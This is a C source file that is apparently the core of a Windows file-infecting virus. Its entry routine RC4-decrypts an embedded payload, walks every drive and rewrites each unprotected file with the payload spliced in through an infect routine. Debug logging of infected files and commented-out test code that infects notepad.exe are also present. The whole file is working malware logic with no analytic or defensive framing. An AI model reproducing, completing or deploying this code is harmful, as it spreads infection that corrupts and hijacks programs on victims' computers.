#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <io.h>
#include "infect.h"
#include "common.h"
#include "morf.h"
#include "loader.h"
#include "find.h"
#include "drop.h"

bool _stdcall P(wchar_t *dir,void *arg){
	BLOCK *b=(BLOCK *)arg;
	bool r=false;
	BLOCK a,c;

	if (is_file_protected(dir)) return r;
	#if _DEBUG
		m_wprintf(L"%s - open\n",dir);
	#endif
	if (!load_file(dir,&a)){
		return r;
	}

	if (!infect(a,*b,&c)){
		m_free(a.data);
		return r;
	}

	r=save_file(dir,&c);
	#if _DEBUG
		wchar_t buf[512];
		if (r) {
			m_wprintf(L"%s - %s\n",dir,L"ok");
			_snwprintf(buf,sizeof(buf)-1,L"%s - %s\n",dir,L"ok");
			append_file(L"log.txt",buf);
		}
		else {
			m_wprintf(L"%s - %s\n",dir,L"no");

			//_snwprintf(buf,sizeof(buf)-1,L"%s - %s\n",dir,L"no");
			//append_file(L"log.txt",buf);
		}
	#endif	
	
	m_free(a.data);
	m_free(c.data);

	return r;
}

int entry(){
	BLOCK b;
	b.size=sizeof(DROP);
	b.data=(uint8*)DROP;
	crypt(b.data,b.size,DROP_KEY,_CIP_RC4);
/*
	if (!load_file(L"notepad.dat",&b)){
		return 0;
	}
*/
	find_drive(L"*.*",P,&b);
	//find_dir(L"C:\\",L"*.exe",P,&d);
	#if _DEBUG
		m_wprintf(L"%s\n",L"exit infected");
	#endif
	return 0;
/*
	BLOCK a,b,c;
	if (!load_file(L"..\\test\\notepad.exe",&a)){
		return 0;
	}

	if (!load_file(L"..\\test\\calc.exe",&b)){
		m_free(a.data);
		return 0;
	}

	if (!infect(a,b,&c)){
		m_free(a.data);
		m_free(b.data);
		return 0;
	}

	bool r=save_file(L"..\\test\\notepad4.exe",&c);
	m_free(a.data);
	m_free(b.data);
	m_free(c.data);
*/
	return 0;
}